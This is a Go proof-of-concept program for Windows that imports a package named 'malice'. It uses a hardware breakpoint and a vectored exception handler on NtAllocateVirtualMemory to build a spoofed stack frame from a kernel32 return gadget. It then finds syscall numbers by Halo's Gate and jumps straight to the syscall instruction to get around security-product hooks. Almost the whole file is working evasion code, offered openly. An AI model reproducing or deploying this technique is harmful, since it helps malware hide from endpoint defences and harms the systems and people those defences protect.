package main

import (
	"bytes"
	"fmt"
	"unsafe"

	"github.com/redt1de/malice/pkg/callz"
	"github.com/redt1de/malice/pkg/veh"
	"golang.org/x/sys/windows"
)

const (
	STACK_ARGS_LENGTH     = 8
	STACK_ARGS_RSP_OFFSET = 0x28
)

var (
	proc          *windows.LazyProc
	ntFuncAddr    uintptr
	retGadgetAddr uintptr
)

func main() {

	proc = windows.NewLazySystemDLL("ntdll.dll").NewProc("NtAllocateVirtualMemory")
	ntFuncAddr = proc.Addr()

	retGadgetAddr = findAddRSP68RetGadget()
	fmt.Printf("[+] found Add RSP,68; ret; gadget at 0x%x\n", retGadgetAddr)

	hand := windows.NewCallback(handler)
	vh, _ := veh.New(hand)
	fmt.Printf("[+] VEH in place, handler Addr: 0x%x\n", hand)

	vh.SetBPLocal(ntFuncAddr, windows.CurrentThread())
	fmt.Printf("[+] Set BP on NtAllocateVirtualMemory(): 0x%x\n", ntFuncAddr)

	fmt.Printf("[!] Calling NtAllocateVirtualMemory()\n")

	allocatedAddress := uintptr(0)
	allocatedsize := uintptr(0x8181)
	r1, r2, e := proc.Call(
		uintptr(0xffffffffffffffff),                //ProcessHandle
		uintptr(unsafe.Pointer(&allocatedAddress)), //*BaseAddress
		uintptr(0),                              //ZeroBits
		uintptr(unsafe.Pointer(&allocatedsize)), //RegionSize
		uintptr(0x00001000|0x00002000),          //AllocationType
		windows.PAGE_READWRITE,
	)
	fmt.Println(r1, r2, e)
	fmt.Printf("address: 0x%x\n", allocatedAddress)
	vh.Kill()
}

//go:nosplit
func handler(e *veh.EXCEPTION_POINTERS) uintptr {
	// println("?///////////////////////////////////////")
	if e.ExceptionRecord.ExceptionCode == veh.EXCEPTION_SINGLE_STEP {
		if e.ContextRecord.Rip == uint64(ntFuncAddr) {
			println("[+] NTAPI Function Breakpoint Hit")
			// HwSyscall sets this back to PrepareSyscall, but we are just gonna remove it for now
			e.ContextRecord.Dr0 = 0
			e.ContextRecord.Dr7 = veh.SetBits(e.ContextRecord.Dr7, 0, 1, 0)
			e.ContextRecord.Dr6 = 0
			e.ContextRecord.EFlags |= 0x10000

			// Create a new stack to spoof the kernel32 function address The stack size will be 0x70 which is compatible with the RET_GADGET we found.
			// sub rsp, 70
			e.ContextRecord.Rsp -= 0x70

			// mov rsp, RET_GADGET_ADDRESS
			*(*uint64)(unsafe.Pointer(uintptr(e.ContextRecord.Rsp))) = uint64(retGadgetAddr)
			println("[+] Created a new stack frame with retGadgetAddr as the return address")

			// // Copy the stack arguments from the original stack
			var idx uint64
			for idx = 0; idx < STACK_ARGS_LENGTH; idx++ {
				offset := idx*STACK_ARGS_LENGTH + STACK_ARGS_RSP_OFFSET
				*(*uint64)(unsafe.Pointer(uintptr(e.ContextRecord.Rsp + offset))) = *(*uint64)(unsafe.Pointer(uintptr(e.ContextRecord.Rsp + offset + 0x70)))
			}
			println("[+] Original stack arguments successfully copied over to the new stack")

			if !callz.IsHooked(uintptr(e.ContextRecord.Rip)) && 2 == 1 {
				println("[+] function is not hooked, proceeding with normal execution")
			} else {
				println("[!] function is hooked!")
				println("[+] Looking for the SSN via Halos Gate")
				syscallNum := findSyscallNumber(uintptr(e.ContextRecord.Rip))
				syscallReturnAddress := findSyscallRetGadget(uintptr(e.ContextRecord.Rip), syscallNum)

				// // mov r10, rcx
				println("[+] Moving RCX to R10 (mov r10, rcx)")
				e.ContextRecord.R10 = e.ContextRecord.Rcx

				// //mov eax, SSN
				println("[+] Moving SSN to RAX")
				e.ContextRecord.Rax = syscallNum
				// //Set RIP to syscall;ret; opcode address
				println("[+] Jumping to \"syscall;ret;\" opcode address")
				e.ContextRecord.Rip = syscallReturnAddress

			}

		}
		return uintptr(veh.UEXCEPTION_CONTINUE_EXECUTION)
	}

	return uintptr(veh.EXCEPTION_CONTINUE_SEARCH)
}

func findAddRSP68RetGadget() uintptr {
	ret := callz.FindInModule("kernel32.dll", []byte{0x48, 0x83, 0xC4, 0x68, 0xC3})
	if ret == 0 {
		ret = callz.FindInModule("kernelbase.dll", []byte{0x48, 0x83, 0xC4, 0x68, 0xC3})
	}
	return ret
}

func findSyscallNumber(functionAddress uintptr) uint64 {
	//var HookCheck = []byte{0x4c, 0x8b, 0xd1, 0xb8}
	var syscallNumber uint64
	var idx uint64
	stbSz := uint64(32)

	for idx = 1; idx <= 500; idx++ {
		curStubUp := unsafe.Slice((*byte)(unsafe.Pointer(functionAddress+uintptr(stbSz*idx))), stbSz)
		if curStubUp[0] == 0x4c && curStubUp[1] == 0x8b && curStubUp[2] == 0xd1 && curStubUp[3] == 0xb8 {
			syscallNumber = uint64(curStubUp[4]) - idx
			break
		}

		curStubDown := unsafe.Slice((*byte)(unsafe.Pointer(functionAddress-uintptr(stbSz*idx))), stbSz)
		if curStubDown[0] == 0x4c && curStubDown[1] == 0x8b && curStubDown[2] == 0xd1 && curStubDown[3] == 0xb8 {
			syscallNumber = uint64(curStubDown[4]) + idx
			break
		}
	}

	if syscallNumber == 0 {
		println("[-] Could not find SSN")

	}
	return uint64(syscallNumber)
}

func findSyscallRetGadget(functionAddress uintptr, syscallNumber uint64) uint64 {
	var syscallReturnAddress uint64
	stbSz := uint64(32)
	curStub := unsafe.Slice((*byte)(unsafe.Pointer(functionAddress)), stbSz)
	ind := bytes.Index(curStub, []byte{0x0f, 0x05})
	syscallReturnAddress = uint64(functionAddress) + uint64(ind)

	if syscallReturnAddress == 0 {
		println("[-] Could not find \"syscall;ret;\" opcode address")
	}

	return syscallReturnAddress
}
